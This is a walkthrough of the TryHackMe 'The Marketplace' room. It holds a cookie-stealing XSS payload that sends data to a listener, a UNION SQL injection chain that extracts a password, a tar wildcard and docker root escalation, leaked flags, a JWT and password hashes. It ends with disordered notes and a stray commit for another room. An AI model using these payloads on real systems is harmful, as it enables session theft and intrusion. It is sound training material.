# TryHackMe: The Marketplace

## Challenge Description

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

## Planning and Scoping

**Target**: 10.10.159.164

## Information Gathering and Reconnaissance

Nmap was used to scan the target for open ports and services:

```bash
nmap -sC -sV 10.10.159.164
```

Results showed the following open ports and services:

- 22/tcp: OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- 80/tcp: nginx 1.19.2
- 32768/tcp: Node.js (Express middleware)

## Threat Modeling

Identify potential risks and vulnerabilities in the web application's architecture.

## Vulnerability Assessment

Based on the information gathered during the reconnaissance phase, the following vulnerabilities were identified:

1. Cross-Site Scripting (XXS)
2. SQL Injection (SQLi)

## Exploitation

### Cross-Site Scripting (XXS)

An XXS payload was used to fetch cookies:

```javascript
<script>fetch('http://10.10.255.67:8080?asdf=' + document.cookie, {method: 'GET'})</script>
```

The XSS vulnerability was found when creating a new listing, specifically in the description field. The following CURL command was used to inject the XSS payload into the description:

```bash
curl 'http://10.10.255.67/new' -X POST -H 'Cookie: token=ourLoginCookie' -H --data-raw 'title=asdf&description=%3Cscript%3Efetch%28%27http%3A%2F%2F10.10.41.122%3A8080%3Fasdf%3D%27+%2B+document.cookie%2C+%7Bmethod%3A+%27GET%27%7D%29%3C%2Fscript%3E'
```

The listing was then reported to an admin, who would view the listing and trigger the XSS payload, sending their cookie to our listener:

```bash
curl 'http://10.10.255.67/report/3' -X POST -H 'Cookie: token=ourLoginCookie'
```

```bash
python -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.255.67 - - [03/May/2023 23:46:34] "GET /?asdf=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2ODMxNTM5OTN9.IQIEQSbQuGhaEUALpITq4LlZLHVk6uNNyY9DJ4kAfIU HTTP/1.1" 200 -
```

We edit our cookie and we are now logged in as an administrator.

```
THM{c37a63895910e478f28669b048c348d5}
```

### SQL Injection (SQLi)

A series of SQL injection payloads were used to extract information from the database:

1. Enumerate table names
2. Enumerate column names for the 'users' table
3. Enumerate table types
4. Enumerate column names for the 'messages' table
5. Extract password from the 'messages' table
6. Extract username and ID from the 'users' table

```sql
http://10.10.255.67/admin?user=5 UNION SELECT user_to, GROUP_CONCAT(message_content SEPARATOR ', '), user_to, user_to FROM messages where id=1
```

The discovered SSH password for user 'jake' was: @b_ENXkGYUCAv3zJ. We can find the second flag.

```bash
jake@the-marketplace:~$ cat user.txt 
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

### Privilege Escalation

Privilege escalation was achieved using a vulnerability in the backup script:

```bash
jake@the-marketplace:~$ sudo -l
(michael) NOPASSWD: /opt/backups/backup.sh

jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```


```bash
cd /opt/backups
chmod 777 backup.tar
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=bash'
sudo -u michael /opt/backups/backup.sh
```

## Privilege Escalation: Docker Group Exploitation

During the assessment, it was discovered that the user 'michael' is a member of the 'docker' group. This allows the user to execute Docker commands, which can lead to privilege escalation.

The following steps were taken to exploit this vulnerability:

1. Create a temporary directory and navigate to it:

```
mkdir /tmp/test && cd /tmp/test
```

2. Create a Dockerfile with the following content:

```docker
FROM alpine
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME [ $WORKDIR ]
WORKDIR $WORKDIR
```

3. Save the Dockerfile and build a malicious Docker image:

```bash
docker build -t malicious-docker .
```

4. Run a Docker container using the malicious image and mount the root filesystem:

```bash
docker run -v /:/privesc -it malicious-docker /bin/sh
```

This step grants access to the host's root filesystem inside the Docker container, allowing for further exploration and exploitation of the system.

```bash
cat /root/root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```



## Recommendations

1. Implement input validation and output encoding to mitigate XXS vulnerabilities.
2. Use prepared statements and parameterized queries to mitigate SQL injection vulnerabilities.
3. Restrict access to sensitive directories and files.
4. Secure backup scripts to prevent privilege escalation.




## Commit
git add TryHackMe\ -\ Ice.md
git commit -m "Ice Looting"
git push -u origin master






Then SQLi
http://10.10.159.164/admin?user=5 UNION SELECT 2, GROUP_CONCAT(table_name SEPARATOR ', '), 2, 3 FROM information_schema.tables;

http://10.10.159.164/admin?user=5 UNION SELECT 2, GROUP_CONCAT(column_name SEPARATOR ', '), 2, 3 FROM information_schema.columns WHERE table_name = 'users';
User id, isAdministrator, password, username 

http://10.10.159.164/admin?user=5 UNION SELECT 2, GROUP_CONCAT(table_name SEPARATOR ', '), table_type, 3 FROM information_schema.tables where table_type = 'BASE TABLE'
items, messages, users 

http://10.10.159.164/admin?user=5 UNION SELECT 2, GROUP_CONCAT(column_name SEPARATOR ', '), 2, 3 FROM information_schema.columns where table_name = 'messages'
id, is_read, message_content, user_from, user_to 

http://10.10.159.164/admin?user=5 UNION SELECT user_to, GROUP_CONCAT(message_content SEPARATOR ', '), user_to, user_to FROM messages where id=1
User 3
User Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ

http://10.10.159.164/admin?user=5 UNION SELECT id, GROUP_CONCAT(username%20 SEPARATOR ', '), id, 3 FROM users where id=3
User 3
User jake
ID: 3 


chmod 777 backup.tar
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=bash'
sudo -u michael /opt/backups/backup.sh


By having docker

docker exec 3c6f21da8043 cat Dockerfile
docker exec -it 3c6f21da8043 /bin/bash






# Post-Exploitation

#Reporting and Remediation


Removing michael from the docker group with


system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
asdf:$2b$10$6NkeqOPRTlJaiGtZ16asnOL4tKH1evTWJHP6VPVwhPOZGxFgge1UO